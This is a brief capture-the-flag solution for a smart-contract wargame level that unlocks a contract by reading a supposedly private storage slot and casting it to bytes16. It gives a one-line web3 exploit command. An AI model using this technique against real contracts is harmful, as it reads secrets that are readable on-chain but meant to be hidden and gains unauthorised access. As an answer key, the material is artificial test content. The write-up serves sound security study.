# Answer

Goal: Unlock the contract.

## 1. Unlocking

The contract is very similar to 8-vault. The difference is we need to accurately find the data[2] storage slot location and understand casting to lower bit types bytes32 -> bytes16:

```js
await contract.unlock(
  (await web3.eth.getStorageAt(contract.address, 5)).slice(0, 34),
)
```
